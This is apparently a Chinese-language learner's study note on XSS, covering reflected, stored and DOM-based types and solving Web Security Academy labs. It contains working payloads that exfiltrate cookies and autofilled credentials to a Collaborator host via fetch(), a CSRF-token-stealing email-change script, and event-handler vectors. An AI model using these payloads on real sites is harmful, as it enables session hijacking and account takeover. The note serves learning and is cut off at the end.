# Cross-site scripting

## 跨站脚本攻击

## What is cross-site scripting(XSS)?

跨站脚本攻击（XSS）是一种网络安全漏洞，攻击者可借此破坏用户羽存在漏洞的应用程序之间的交互。该漏洞攻击者能绕过同源策略----该策略旨在隔离不同的网站。

XSS通常能使攻击者冒充受害用户，执行该用户可操作的任何行为，并访问其所有数据。

若受害用户在应用程序中拥有特权访问权限，攻击者甚至可能完成掌控该应用程序的所有功能与数据。

## How does XSS work?

XSS通过操控存在漏洞的网站，使其向用户返回恶意的 `javascript` 代码。当恶意代码在受害者浏览器中执行的时候，攻击者便能完全控制其与应用程序的交互过程。

## XSS proof of concept

XSS概念验证

通过注入可触发浏览器执行任意JavaScript的payload，你可验证多数类型的XSS。

长期以来， `alert()` 函数因其简单，无害且成功调用时效果显著，已成为此类验证的常用手段。事实上，在模拟受害者浏览器中调用 `alert()` 即可解决我们绝大多数XSS实验的验证任务。

遗憾的是，若使用chrome浏览器会遇到一些问题。自92版起，跨源iframe将被禁止调用 `alert()` 。由于该功能常被用于构建高级的XSS攻击，有时候需要使用替代的 PoC payload。推荐使用 `print()` 函数。

## What are the types of XSS attacks?

- #### Reflected XSS

  反射型XSS，其中恶意脚本来源于当前HTTP请求。

- #### Stored XSS

  存储型XSS，其中恶意脚本来源于网站数据库。

- #### DMO-based XSS 

  基于DOM的XSS，其漏洞存在于客户端代码而非服务器代码中。

  

## Reflected cross-site scripting

### What is reflected XSS?

反射性XSS是最简单的XSS类型。

当应用程序接收HTTP请求中的数据，并以不安全的方式将该数据直接包含在响应中时，就会引起此类攻击。

以下是一个反射型XSS漏洞的简单示例：

```
https://insecure-website.com/status?message=All+is+well.
<p>Status: All is well.</p>
```

该应用程序不会对数据进行任何其他处理，因此攻击者可以轻松造成如下的攻击：

```
https://insecure-website.com/status?message=<script>/*+Bad+stuff+here...+*/</script>
<p>Status: <script>/* Bad stuff here... */</script></p>
```

若用户访问攻击者构造的URL，攻击者的脚本便会在用户浏览器中执行，且以该用户于应用程序的会话为执行环境。此时，该脚本可执行用户有权访问的任何操作，并获取用户可访问的任何数据。

#### 详细示例：

假设有个网站的搜索功能能够通过URL参数接收用户提供的搜索词：

```
https://insecure-website.com/search?term=gift
```

该应用程序在响应此URL时会回显提供的搜索词：

```
<p>You searched for: gift</p>
```

假设应用程序不会对数据进行任何其他处理，攻击者可以构造如下攻击：

```
https://insecure-website.com/search?term=<script>/*+Bad+stuff+here...+*/</script>
```

此URL返回以下响应：

```
<p>You searched for: <script>/*+Bad+stuff+here...+*/</script>
```

若应用程序的其他用户请求攻击者的URL,则攻击者提供的脚本将在受害者用户浏览器中执行，且该执行行为将承载于受害用户于应用程序的会话上下文中。 意味着恶意脚本在受害者浏览器中运行时，具有与受害者相同的权限和访问权，可以代表受害者执行操作，因为脚本在应用程序的域下执行，并能访问会话数据。、



##### 重点：

当用户在搜索框搜索的时候，浏览器执行脚本的时候，看到 `<script>` 标签时，不会把它当作普通的文本显示，而是真的执行其中的 `javascript` 的代码：

所以：

- `<script>` 告诉浏览器，这里开始是`JavaScript` 代码
- `alert(1)` 是`JavaScript` 函数，作用是弹出警告框
- `</script>` 是指标签结束

##### 漏洞的根本原因：

网站对用户的输入没有进行适当的过滤或者转义。



#### LAB：将反射型XSS注入HTML上下文，且未进行任何编码

##### question：

该实验室的搜索功能存在一个简单的反射型跨站脚本漏洞。

要完成该实验，请执行一次跨站脚本攻击，调用`alert` 函数。

##### Pain Point:

- 没有理解为什么要在搜索框中输入此payload
- 原因：由于该应用程序没有对用户的输入进行适当的过滤或者转义，所以用户在搜索框中输入 `script` 标签的时候，浏览器把该标签认为是`JavaScript` 代码，所以执行了该代码。
- 而 `alert()` 是`JavaScript` 函数，作用是弹出警告框

##### Solved:

1. 在搜索框中输入 `<script>alert(1)</script>`
2. 点击搜索



### Impact of reflected XSS attacks

如果攻击者能够控制在受害者浏览器中执行的脚本，通常就能完全的控制该用户。攻击者可实施的操作包括：

- 执行用户可在应用程序中执行的任何操作
- 查看用户有权查看的任何信息
- 修改用户能修改的任何信息
- 发起于其他应用程序用户的交互，包括恶意攻击，这些交互将看似源自最初的受害用户

攻击者可能通过多种手段诱使受害用户发出其可控的请求，从而实施反射型XSS，这些手段包括：

- 在攻击者控制的网站上放置连接
- 或在允许生成内容的其他网站放置链接
- 或通过电子邮件，推文或其他信息发送链接。

此类攻击既可以针对特定已知用户，也可以对应用程序的任意用户实施无差别攻击。

反射型XSS攻击需要外部传递机制，这意味着其危害程度通常低于存储型XSS——后者可在易受攻击的应用程序内部直接执行自包含攻击。



## Exploiting XSS vulnerabilities

利用XSS漏洞

传统上，验证是否发现XSS漏洞的方法是通过 `alert()` 函数创建弹出窗口。这并非因为XSS与弹出窗口存在关联，而是为了证明能在特定域名上执行任意的`JavaScript` 代码。

也有人会使用 `alert(document.domain)`。

这种写法，是为了明确标注`JavaScript` 的执行域，显示当前网页的域名，证明了攻击脚本能访问和操作浏览器环境。

这是更高级的概念验证，显示攻击的范围和上下文。



有时候可能**需要更加完整的利用方案来证明XSS漏洞确实构成威胁。**

本节将探讨三种最流行的且最强大的XSS漏洞利用方式。

### Exploiting XSS to steal cookies

窃取cookie是利用XSS的传统手段。多数Web应用程序使用Cookie进行会话管理（网站跟踪用户状态的方法）。攻击者可利用XSS漏洞将受害者的Cookie发送到自身域名，随后手动将Cookie注入浏览器，从而冒充受害者身份。

实际上，这种方法存在一些显著的局限性：

- 受害者可能未登录

  用户未登陆的话，`document.cookie` 可能是：

  `"theme=dark;language=zh-CN"`

  而不是：

  `"sessionId=abc123;userId=789"`

  没有会话cookie就无法冒充用户身份。

- 许多应用程序通过 `HttpOnly` 标志隐藏 `JavaScript` 的 `Cookie`.

  `httpOnly` 是什么？

  这是Cookie的一个安全属性：

  ```
  Set-Cookie:sessionId=abc123;HttpOnly;Secure
  ```

   `HttpOnly` 的作用：

  阻止 `JavaScript` 访问。

  仅限`HTTP` 请求：浏览器会在请求中自动携带，但脚本无法直接访问。

- 会话可能会被锁定再用户IP地址等额外因素上。

  除了Cookie，服务器可能还会验证：

  - IP地址
  - User-Agent

- 会话可能会在你劫持之前就超时了。



### LAB:Exploiting cross-site scripting to steal cookies

#### Question:

本实验在博客评论功能中存在一个存储型跨站脚本漏洞。模拟受害用户在评论发布后会查看所有评论。为完成实验，需利用该漏洞窃取受害者的会话Cookie，随后使用该Cookie冒充受害者身份。

#### Pain Point:

- 找不到写脚本的地方

  因为被误导了，以为是反射型XSS，一直在找反射点。

- 存储型XSS的script的写法：

  ```
  <script>
  fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
  method: 'POST',
  mode: 'no-cors',
  body:document.cookie
  });
  </script>
  ```

  #### 本质原理：

  - 把脚本提交到评论区
  - 评论区内容存进数据库
  - 管理员打开页面的时候，这段HTML被重新加载
  - 浏览器看到<script>会执行其中的 `JavaScript` 

  总的来说：

  **你写进去的内容被存储之后，再由别人浏览器执行。**

  这就是 `Stored XSS`

  #### Payload 原理：

  ##### `fetch` :

  ```
  fetch('http://你的域名'，{.....})
  ```

  是浏览器中的一个**发网络请求的API**。

  平常是这样用来请求接口的：

  `fetch('/api/user')`

  但这里是用来说明：

  **如果浏览器执行了攻击者的脚本，它可以向攻击者的服务器发送任意的数据。**

  ##### `method:'POST'`

  告诉浏览器：**发送一个POST请求。**

  并不是以为 `POST`比`GET` 更有攻击性，而是：

  - `POST` 能带走请求body
  - body可以放更多数据（例如cookie）

  ##### `mode:'no-cors'`

  这是为了让浏览器无条件发送请求。

  这里关键点：

  - 正常跨站请求会被 `CORS` 拦住
  - 但 `no-cors` 模式允许 “盲发请求”
  - 虽然JS拿不到返回值，但请求本身仍然会发出去

  ##### `body:document.cookie`

  `document.cookie` = 浏览器能够访问到所有`非 HttpOnly cookie`

#### Solved:

1. copy collaborator中生成的唯一域名

2. 在评论区输入script脚本payload：

   ```
   <script>
   fetch('http://域名',{
   method:'POST',
   mode:'no-cors',
   body:document.cookie
   });
   </script>
   ```

3. 在collaborator中点击poll now.

4. 查看HTTP交互中的cookie值：

   ```
   session=iK35fWX9uBtSuFMPp4SId7NACZPmY9ZV
   ```

5. 重新刷新页面，用burp拦截请求，修改cookie值，用HTTP交互中所窃取的cookie。





### Exploiting XSS to capture passwprd

利用XSS窃取密码

如今，很多用户都使用密码管理器自动填写密码。

那么就可以利用这一特性：创建密码输入框，读取自动填充的密码，并将其发送到你自己的域名。这种方法能规避大多数与窃取Cookie相关的问题，甚至能获取受害者在其他所有账户中重复使用的相同密码。

该技术的缺点在于：
它仅对使用支持密码自动填充功能的密码管理器的用户有效。

（如果用户为保存密码，仍可尝试通过站内钓鱼攻击获取密码，但效果并不尽然相同。）





### LAB:Exploiting cross-site scripting to capture passwords

#### Question:

本实验中博客评论功能存在存储型跨站脚本漏洞。模拟受害用户会查看所有已发布的评论。为完成实验，需利用该漏洞窃取受害者的用户名和密码，随后使用这些凭证登录受害者账户。

#### Pain Point:

- 不会JavaScript的基础用法（后续学习）

- ##### PAYload原理:

  ```
  <input name=username id=username>
  <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
  method:'POST',
  mode: 'no-cors',
  body:username.value+':'+this.value
  });">
  ```

  总：攻击者伪造了一个登录表单，当受害者输入密码时，JS自动把用户名+密码发送给攻击者服务器。

  `<input name=username id=username>`

  伪造用户名输入框

  - 创建一个 <input> 文本框
  - `id=username` 为了JS能通过 `username.value`读取内容
  - `name=username`假装这是合法的用户名字段

  第二行input：

  伪造密码输入框+放入恶意JavaScript

#### Solved:

1. 复制唯一域名

2. 在评论区创建恶意脚本

3. 检查collaborator收到的HTTP交互

4. 查看详情，可以看到用户名和密码。

   ```
   administrator:nd2euvwakr0j5ftcmc7a
   ```





### Exploiting XSS to bypass CSRF protections

利用XSS绕过CSRF防护

XSS使攻击者能够在网站上执行几乎所有合法用户可操作的指令。通过在受害者浏览器执行任意`JavaScript` 代码，攻击者可冒充受害者身份实施多种操作：例如诱使受害者发送消息，接收好友请求，向源代码仓库植入后门程序，或转移比特币资产。

某些网站允许已登录的用户无需重新输入密码即可更改电子邮件地址。若在这些网站上发现XSS漏洞，可以利用该漏洞窃取跨站请求伪造（CSRF）令牌。获取令牌之后，即可将受害者的邮箱地址修改为自己控制的地址，进而触发密码重置流程，从而获取账户的访问权限。

此类漏洞利用结合了XSS（用于窃取CSRF令牌）与CSRF攻击通常针对的功能。传统的CSRF属于单项漏洞——攻击者诱使受害者发送请求但无法查看响应，而XSS则实现了”双向“通信。这使攻击者既能发送任意请求又能读取响应，从而形成一种混合攻击，能够绕过反CSRF防御攻击。



### LAB:Exploiting XSS to bypass CSRF defenses

#### Question:

本实验包含博客评论功能中的存储型跨站脚本漏洞。要完成实验，需利用该漏洞窃取CSRF令牌，随后可利用该令牌修改查看博客评论者的电子邮件地址。

您可以使用以下凭据登录自己的账户：`wiener:peter` 。

您无法注册已被其他用户占用的电子邮件地址。若在测试漏洞利用过程中更改了自身邮箱，请在向受害者交付最终漏洞利用程序时使用不同的电子邮件地址。

#### Pain POint:

- 看不懂，应该先学其他的部分的。

  凑合看看

- 题目解读：

  博客评论功能存在 XSS存储型漏洞——任何人都看到你的评论，浏览器会执行你插入的JS

  每个用户在更新邮箱时都有CSRF Token——必须提交正确的token才能修改邮箱。

  你要做的是利用XSS窃取CSRF token并提交表单——当管理员或受害者浏览你的邮箱时，就会自动修改邮箱。

- ##### payload解释：（JS）

  ```
  <script>
  var req = new XMLHttpRequest();
  req.onload = handleResponse;
  req.open('get','/my-account',true);
  req.send();
  function handleResponse() {
      var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
      var changeReq = new XMLHttpRequest();
      changeReq.open('post', '/my-account/change-email', true);
      changeReq.send('csrf='+token+'&email=test@test.com')
  };
  </script>
  
  ```

  `var rep = new SMLHttpRequest()`;

  - 创建一个新的HTTP请求对象
  - 用来向网站发请求（GET ,POST）
  - 相当于浏览器里面的网路请求工具

  `rep.onload = handleResponse;`

  - 当上一步发出的请求完成加载之后，自动调用 `handleResponse`函数
  - 相当于“请求完成后，做下一步操作”

  `rep.open('get','/my-account',true);`

  - 准备发起`GET` 请求
  - `/my-count` 页面包含用户信息，包括隐藏的CSRF token
  - 第三个参数 `true` 表示异步请求

  `rep.send()`

  - 真正发送请求
  - 浏览器去加载 `/my-count`页面
  - 服务器返回HTML给JS

  `function handleResponse(){....}`

  当 `/my-account`返回的时候，这个函数执行

  `var token = this,responseText.match(/name="csrf" value="(\w+)"/)[1];`

  - `this.responseText`  —— `/my-account` 的HTML文本
  - 用正则表达式把 `<input name="csrf" value="xxxx">` 中的token抓出来。
  - `[1]` ——获取第一个捕获组，也就是`Token` 值

  `var changeReq = new XMLHttpRequest();`

  - 创建另一个HTTP请求，用来提交邮箱修改表单
  - 这次是POST请求

  `changeReq.open('post','/my-account/change-email',true);`

  - 设置目标URL `/my-account/change-email`
  - POST方法发送数据
  - 异步执行

  `changeReq.send('csrf='+token+'&email=test@test.com')`

  - 发送表单数据
  - `csrf=` 填上刚刚抓到的`token`
  - `email=` 填上你想修改的邮箱

  这一步就是利用XSS绕过CSRF：浏览器自动用受害者的身份提交请求。

- ##### 流程总结：

  提交评论——payload被存储

  管理员or用户浏览评论——浏览器执行JS

  JS发送GET请求 `/my-account` ——获取CSRF token

  JS发送POST请求 `/my-account/change-email` ——修改邮箱

#### solved:

1. 根据所获得账户登录

2. 查看评论页面源代码

   - 你需要向 `/my-account/change-email` 发送POST请求，并包含一个名为 `email` 的参数
   - 在名为 `token` 的隐藏输入字段包含一个反CSRF令牌

   这就是意味着你的漏洞利用需要加载用户账户页面，提取CSRF令牌，然后使用该令牌更改受害者的电子邮箱地址。

3. 在博客评论区提交payload。





## Stored XSS

### What is stored XSS?

存储型XSS，也称二次或持久型XSS，发生在应用程序从不可信来源接收数据时，若以不安全的方式将数据包含在其后续的HTTP响应中。

简单说明：

指攻击者把恶意内容（通常是脚本代码）提交到网站并被服务器保存下来，之后每当其他用户访问相关页面的时候，这段恶意内容就会被浏览器当作正常页面的一部分执行。

### Impact of stored XSS attacks

若攻击者能够控制受害者浏览器中执行的脚本，通常便能完全控制该用户，攻击者可实施任何适用于反射型XSS漏洞影响范围的操作。

##### The difference of stored XSS and reflected XSS

就利用性而言，存储型XSS漏洞允许攻击者在应用程序内部完成整个攻击过程。攻击者无需寻找外部途径诱导其他用户发出包含攻击代码的特定请求，而是将攻击代码植入应用程序本身，静待用户触发即可。

反射型XSS的触发不是自动，需要让受害者主动发出包含攻击代码的特定请求，比如让受害者点击一个恶意链接等。



##### The self-contained nature of stored XSS

存储型XSS的自包含特性在特定场景下尤为重要——当XSS漏洞仅影响当前登录应用的用户时。若为反射型XSS，攻击时机必须恰到好处：当用户在为登录状态下执行攻击者诱导的请求时，其账户将不受影响。相反的，若为存储型XSS漏洞，则用户在遭遇漏洞时必然处于登录状态。



### Stroed XSS in different contexts

存储型XSS存在多种变体，应用程序响应中存储数据的位置决定了需要何种payload才能利用该漏洞，同时可能影响的危害程度。

此外，如果应用程序在存储数据前或存储数据纳入响应时执行任何验证或其他处理操作，这通常会影响所需的XSSpayload类型。

更多上下文攻击知识请看：XSS contexts



### How to find and test for stored XSS vulnerabilities

使用burp suite的web漏洞扫描器，可以发现许多已存在的XSS漏洞

**手动检测存储型XSS漏洞**具有挑战性。

需要测试所有相关的**入口点**——攻击者可通过这些入口将可控数据注入应用程序处理流程，以及所有**出口点**——这些出口点可能在应用程序响应中出现该数据。

应用程序处理的入口点包括：

- URL查询字符串和信息正文中的参数和其他数据

- URL文件路径

- 与反射型XSS相关可能无法被利用的XTTP请求头

- 任何攻击者可通过其向应用程序注入数据的带外路径。这些路径的存在完全取决于应用程序实现的功能：网页邮件应用会处理邮件中接收的数据；显示维持动态的应用可能处理第三方推文中的数据；而新闻聚合器则会包含源自其他网站的数据。

- 典型入口点：

  评论系统，用户昵称/简介，留言版，简历上传的文本字段，论坛回帖，发帖，消息系统，文章公告等。

存储型XSS攻击的触发点涵盖所有可能的HTTP响应，这些响应可能在任何情况下返回给任何类型的应用程序用户。

检测存储型XSS漏洞的第一步是定位入口点和出口点之间的关联，即数据从入口点提交后需从出口点输出。此过程具有挑战性的原因在于：

- 提交至任何入口点的数据原则上可从任何出口点输出。

  例如，用户提供的显示名称可能出现在仅对部分应用程序用户可见的隐蔽审计日志中。

- 应用程序当前存储的数据往往任意因程序内其他操作而被覆盖。

  例如，搜索功能可能显示最近搜索的列表，但当用户进行其他搜索的时候，这些记录会迅速被替换。



要全面识别入口与出口点的关联，需要分别测试每种组合：向入口点提交特定值，直接导航至出口点，并判断该值是否出现在出口处。然而，对于页面数量超过几页的应用程序而言，这种方法并不实用。



入口点 ——存储——出口点

在入口点输入数据，刷新页面或在其他页面出现同样的数据，说明链路成立。



更现实的做法是系统性的遍历数据输入点，向每个输入点提交特定值，并监控应用程序的响应以检测提交值出现的场景。可重点关注应用功能，例如博客文章评论。当在响应中观察到提交值时，需要判断数据是否确实被跨请求存储，而非在即时响应中显示。



在应用程序处理流程中识别出入口点之间的关联后，需对每个关联进行专项测试是否存在存储型XSS漏洞。这包括确定响应中存储数据出现的上下文环境，并测试适用于该上下文的潜在有效payload。此时的测试方法与反射型XSS漏洞基本一致。





## DOM-based XSS

基于DOM的XSS

###  What id DOM-based XSS?

#### Simple description:

基于DOM的XSS漏洞通常发生在JavaScript从攻击者提供的可控的来源（如URL）获取数据，并将其传递给支持动态代码执行的接收器（`eval()`或者 `innerHTML`）时。这使攻击者能够执行恶意的JavaScript代码，通常可借此劫持其他用户的账户。

恶意数据进入浏览器（比如URL）——JavaScript在前端处理数据——把数据带入危险的DOM API——导致代码运行

**通俗易懂：**前端JS把URL当作合法数据来使用，但攻击者把URL换成恶意代码。前端JS没有防备就把代码插入页面执行了。



**要实施基于DOM的XSS**，需要将数据注入`source`(源位置)，使其传播至`sink`(目标位置)并触发任意JavaScript代码的执行。

DOM型XSS最常见的`source` 是URL，通常通过 `window.location` 对象访问。攻击者可构造链接，将受害者引向存在漏洞的页面，并在URL的查询字符串和片段部分植入payload。在特定情况下（如针对404页面或运行PHP的网站），payload也可置于路径中。

#### source：

`source（源位置）` 前端JavaScript从哪里获取数据

攻击者必须把数据放入source中，JS才会读到。

##### DOM XSS中常见的source：

- `window.loaction`

  当前页面的整个URL

- `location.search`

  URL的查询参数 `?a=xxx`

- `location.hash`

  #后面的部分，如 `#name=test` ，特点服务器看不到

- `document.referrer`

  来路URL，攻击者可引导

- `document.cookie` 

  cookie

- `localStorage`

  本地存储

#### Sink:

`sink` 把数据插入页面或执行代码的危险API

##### DOM XSS中常见的 Sink:

- `innerHTML` 

  会把内容当作HTML执行

- `document.wirte()`

  也能执行脚本

- `eval()`

  直接执行JS代码

- `setTimeout("code")`

  当字符串时会执行

- `location.href = data`

  有时候涉及跳转

- `outerHTML`

  同`innerHTML`



### How to TEST for DOM-based XSS?

如何检测基于DOM的XSS？

使用burp suite 的scanner，可快速可靠的发现大多数DOM型XSS，若需手动测试DOM的XSS漏洞，通常需要借助开发者工具的浏览器。你需要依次遍历所有可用的源文件，并对每个文件单独进行测试。

#### Testing HTML sinks

测试HTML接收器

要在HTML接收器中测试 DOM XSS，请在源代码中插入随机字母数字字符串（例如`location.search`）,然后使用开发者工具检查HTML并定位该字符串出现的位置。需注意浏览器的”查看源代码“功能无法用于DOM XSS测试，因为它无法反应JavaScript对HTML内容的动态修改。在chrome开发者工具中，可通过（contral F）在DMO树中搜索目标字符串。

对于字符串在DOM中出现的每个位置，你都需要确定其上下文环境。基于该上下文，你需要调整输入内容以观察其处理方式。

例如：若字符串出现在双引号属性内，则尝试在字符串中注入双引号，以验证是否能突破属性限制。

注意：不同浏览器对URL编码的行为存在差异：chrome，Firefox和safari会对 `location.search` 和 `location.hash` 进行URL编码，而 IE11和Microsoft Edge则不会对这些来源进行URL编码。若数据在处理前已被UR;编码，则XSS通常难以得逞。



#### testing JavaScript execution sinks

测试JavaScript执行接收器



测试基于DOM的XSS中的JavaScript执行接收器稍显困难。这类接收器不会将输入内容直接显示在DOM中，因此无法通过搜索定位。此时需要借助JavaScript debugger（调试器）来判断输入是否被发送到接收器，以及具体的传输方式。

对于每个潜在source（例如location），首先需要在页面JavaScript代码中查找引用该资源的位置。在chrome开发者工具中，可通过 `CTRL shift F`在页面所有JavaScript代码中搜索该资源。

一旦找到数据源的读取位置，即可使用JavaScript调试器添加断点，追踪source数据源值得使用路径。你可能会发现source数据源被赋值给其他变量。若出现这种情况，则需再次使用搜索功能追踪这些变量，确认他们是否被传递到接收端。当发现某个接收端被赋予了source源数据时，可通过调试器悬停在变量上查看其值——这将在数据送入接收端前显示其状态。随后如同处理HTML接收端那样，需优化输入参数以验证能否成功实施XSS攻击。



#### Testing for DOM XSS using DOM invader

在实际环境中识别并利用DOM型XSS可能是一个繁琐的过程，通常需要手动梳理复杂的压缩JavaScript代码。但若使用burp浏览器，其内置的DOM入侵者扩展功能便能为您完成大量繁重的工作。





### Exploiting DOM XSS with different sources and sinks

（利用不同source和sinks的DOM XSS攻击）

原则上，若存在可执行路径使数据能从source传播至sink,网站便易受基于DOM的XSS攻击。

实际中，不同source与sink具有差异化的特性和行为，这些特性会影响漏洞可利用性并决定所需采用的技术手段。

此外，网站脚本可能对数据执行验证或其他处理操作，在尝试利用漏洞时必须对此进行适配。与基于DOM的漏洞相关的sink种类繁多。

具体可见——Which sinks can lead to DOM-XSS vulnerabilities?

**例如：**

`document.write` 注入漏洞可与 `script` 元素配合使用，因此你可以使用简单的payload：

```
document.write('...<script>alert(document.domain)</scripts>...');
```

 请注意，在某些情况下，写入 `document.write` 的内容包含一些需要在漏洞利用中考虑的上下文环境。例如：在使用JavaScript payload之前，可能需要先关闭某些现有元素。



`innerHTML` sink 在任何现代浏览器中均不支持 script元素，且 `svg onload` 事件不会触发。这意味着你需要使用替代元素，例如`img ` `iframe` 。事件处理程序如 `onload` 和 `onerroe` 可与这些元素配合使用。例如：

```
element.innerHTML='...<img src=1 onerror=alert(document.domain)>...'
```







#### Sources and sinks in third-party dependencies

(第三方依赖项中的source和sink)

现代网络应用通常采用多种第三方库和框架构建，这些工具常为开发者提供额外功能和能力。

需谨记的是，其中的部分组件也可能成为DOM型XSS的潜在`sources`和`sinks`

##### DOM XSS in jQuery

若使用了`jQuery` 等`JavaScript` 库，需警惕可能修改页面DOM元素的操作的sink。

例如`jQuery` 的 `attr()` 函数可更改DOM元素的属性。若数据源自URL等用户的可控位置，再传递给 `attr()` 函数，则可能通过操控发送值引发XSS攻击。

下例展示了利用URL数据修改锚元素 `href` 属性的`JavaScript` 代码：

```
$(function() {
	$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
});
```

你可以通过修改URL来利用此漏洞，使 `location.search` source包含恶意`JavaScript` 链接。

当页面`JavaScript` 将该恶意链接应用于反向链接的 `href` 后，点击反向链接就会执行该恶意代码：

```
?returnUrl=javascript:alert(document.domain)
```



另一个需要警惕的潜在漏洞就是 `jQuery` 的 `$()` 选择器函数，该函数可被用于向DOM注入恶意对象。

`jQuery` 曾极其受欢迎，而经典的DOM XSS正是源于网站在使用该选择器时，结合 `location.hash` 源代码实现动画效果或页面自动翻滚至特定元素的行为。此类操作通过存在漏洞的 `hashchange` 事件处理程序实现，类似如下代码：

```
$(window).on('hashchange', function() {
	var element = $(location.hash);
	element[0].scrollIntoView();
});
```

由于 `hash` 支持用户自定义，攻击者可利用此特性向 `$()` 选择器sink注入XSS攻击向量。新版`jQuery` 已通过禁止向以井号开头的输入注入HTML的方式修复了此漏洞。但实际环境中仍可能存在有漏洞的代码。



要利用这个经典漏洞，你需要找到一种无需用户交互即可触发 `hashchange` 事件的方法。最简单的方法之一就是通过 `iframe` 来投放你的漏洞利用程序：

```
<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```

在此示例中，`src` 属性通过空哈希值指向存在漏洞的页面。当`iframe` 加载时，XSS向量被附加到哈希值之后，触发了 `hashchange` 事件。



##### DOM XSS in AngularJS

若使用`AngularJS` 这类框架，可能无需尖括号或事件即可执行JavaScript。

当网站在HTML element上使用`ng-app`属性时，该元素将被`AngularJS` 处理。

此时，AngularJS会执行双花括号内的JavaScript代码，这些代码既可以出现在HTML中，也可以嵌套在属性内部。





### DOM XSS combined with reflected and stored data

（DOM XSS 结合反射型和存储型数据）

某些纯基于DOM的漏洞仅存在于单个页面中。若脚本从URL读取数据并将其写入危险`SINK` ，则该漏洞完成属于客户端范畴。

然而，sources不仅限于浏览器直接暴露的信息——他们也可能来自网站本身。

例如，网站常会在服务器返回的HTML响应中反应URL参数。这种情况通常与常规的XSS相关，但也有可能导致反射型DOM跨站脚本漏洞。

在反射型DOM XSS漏洞中，服务器处理请求数据后，将数据原样回显至响应中。这些反射数据可能被置于JavaScript字符串字面量，或DOM中的数据项（如表单字段）随后页面上的脚本以不安全的方式处理这些反射数据，最终将其写入危险的sink.

```
eval('var data = "reflected string"');
```













### LAB:DOM XSS in document.write sink using source location.search

#### Question:

该实验室的搜索查询追踪功能存在基于DOM的跨站脚本漏洞。

该漏洞利用JavaScript的`document.write` 函数将数据写入页面。`document.write` 函数调用时会使用来自`location.search` 的数据，而该数据可通过网站URL进行操控。

要完成本实验，请执行一次跨站脚本攻击，调用`alert` 函数。

#### Pain POint:

- 解析题目：

  `document.write` 调用来自 `location.search` 的数据，也就是说：
  sink: `document.write`

  source: `location.search`

  数据流：你控制URL——控制`location.search` ——控制`document.write` 

- 注意上下文，所以要查看 `document.write` 也就是sink处于脚本中的哪个位置

  方法：devtools——Elements面板

  F12，进入ELements元素面板

  CTRL F，搜索img或者abc123就可以找到了。

  ![image-20251129184718210](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251129184718210.png)

  这题的context就是 

  ```
  document.write('<img src="/resources/images/tracker.gif?searchTerms=' query '">');
  ```

  而query就是搜索框中输入的字符串。

  所以我先得逃出src属性！！！

  构建payload：

  ```
  ">    逃出src属性
  <svg onload=alert(1)>       恶意代码。
  ```

#### Solved:

1. 理解题目，找到sink和source
2. 搜索字符串，以便查看sink在context中的具体位置
3. 打开element面板
4. 找到对应的context，以及sink和source的语句。
5. 构建payload。





### LAB:DOM XSS in `document.write` sink using source `location.search` inside a select element

#### Question:

该实验室的股票查询功能存在基于DOM的跨站脚本漏洞。该漏洞利用JavaScript的`document.write` 函数将数据写入页面。`document.write` 函数调用时会接收来自`location.search` 的数据，用户可通过网站URL控制该数据。数据被封装在select元素中。

要完成本实验，请执行一次跨站脚本攻击，使其突破select元素的限制并调用`alert` 函数。

#### Pain Point:

- payload跳出属性的方式不同：

  本题中不是搜索框的DOM漏洞，而是下拉选择框的漏洞。

  所以在context中，不仅要跳出<option>的标签还要跳出<select>标签

  所以组合就变成了 `"></select>` 

- 插入恶意代码的时候：

  本题的题解中用了 `<img src=1 onerror=alert(1)>`

  用img是因为在<select>外部中，<img>最稳定。

  但是在本题中，以下几个恶意代码都能触发XSS：

  ```
  <img src=1 onerror=alert(1)>
  <svg onload=alert(1)>
  <iframe onload=alert(1)>
  <details open ontoggle=alert(1)>
  <marquee onstart=alert(1)>
  ```

- 在没有输入框可输入文本的时候，可以直接在URL中修改。

- ![image-20251129200939800](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251129200939800.png)



#### Solved:

1. 找到可使用插入DOM漏洞的地方：如本题中的下拉选项框
2. 打开element面板
3. 搜索London等选项中的字样，找到sink：如本题中的document.write
4. 根据context来构建payload
5. 要跳出标签，<option>和<select>标签，然后再构建恶意代码。





### LAB:DOM XSS in `innerHTML` sink using source `location.search`

#### Question:

该实验室的搜索博客功能存在基于DOM的跨站脚本漏洞。该漏洞利用`innerHTML` 赋值操作，通过`location.search` 提供的数据修改`div` 元素的HTML内容。

要完成本实验，请执行一次跨站脚本攻击，调用`alert` 函数。

#### Pain POint:

- 没有！！！！独立完成

- payload：

  ```
  "></span><svg onload=alert(1)>
  ```



#### Sovled:









### LAB：DOM XSS in jQuery anchor `href`  attribute sink using `location.search` source

#### Question:

该实验室的提交反馈页面存在基于DOM的跨站脚本漏洞。该漏洞利用jQuery库的`$` 选择器函数定位锚点元素，并通过`location.search` 提供的数据修改其`href` 属性。

要完成本实验，请使"返回"链接跳转至`document.cookie` 。

#### Pain Point:

- ##### 在按照以往的步骤寻找的时候，submit message 在element面板中不出现message，而在element面板中搜索$，看到context的结构：

  ![image-20251130121312775](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251130121312775.png)

  此处的痛点就是，不知道为什么这道题不是在message中提交测试字符串，而是在URL中提交。

  一定要会看context 结构，此题的结构中，`window.location` `get('returnPath')`

  从URL参数 returnPath中取值，然后直接写入 `<a id="backlink" href="你输入的内容">Go back</a>`

- ##### 注入点为属性值，不是HTML,所以不用跳出标签

  本题中：`href=""` 这只是一个属性位置，你能控制整个属性值，所以不需要跳出。

  这个时候只需要构造一个可以当作 href的可执行协议：`javascript.alert(1)` 

- ##### 为什么不需要在message中提交payload：

  因为这个表单进不去sink.

  ![image-20251130123313820](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251130123313820.png)

  #`backLink` 的`href` 是由URL参数控制的，不是由`feedback` 表单控制的。

- ##### 为什么这道题仍然是DOM XSS

  `attr("href",userInput)` 执行于浏览器，而不是服务器生成

  sink是：

  - jQuery.attr()
  - 写入属性

- ##### 怎么识别”无需跳出结构“的情况

  **先看注入点：**

  如果注入点是：

  ```
  href=""
  src=""
  action=""
  form=""
  ```

  这就是属性上下文。

  **再看属性是否接受JavaScript协议**

  只要浏览器允许：

  ```
